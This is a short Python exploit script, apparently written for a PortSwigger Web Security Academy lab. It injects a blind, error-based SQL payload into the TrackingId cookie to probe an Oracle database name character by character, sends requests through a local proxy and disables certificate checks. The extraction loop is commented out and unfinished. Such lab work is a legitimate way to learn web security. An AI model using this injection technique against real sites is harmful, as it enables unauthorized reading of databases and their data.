import requests 
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

atz = "abcdefghijklmnopqrstuvwxyz1234567890._-!".lower()

url = "https://0a35002b03c7d82180b9033600c5001d.web-security-academy.net/filter?category=Pets"
s = requests.Session()


initial_request = s.get(url)
TrackingId = initial_request.cookies.values()[0]
session = initial_request.cookies.values()[1]

print(TrackingId, session)




proxy_url = {
    "http" : "http://127.0.0.1:8080",
    "https" : "http://127.0.0.1:8080",
}

result = ""

# for i in range(30):
#     for j in atz:
        
        
        
        
        
# print(result)


header = {
            "Cookie" : f"TrackingId={TrackingId}' or SUBSTR((SELECT name FROM V$DATABASE;), 1, 1) = 'O' -- ; session={session}"
        }

res = requests.get(url, proxies=proxy_url, headers=header, verify=False)

if re.search(b"Internal Server Error", res.content):
    print("error")
else:
    print("Not Error")
    # result += j
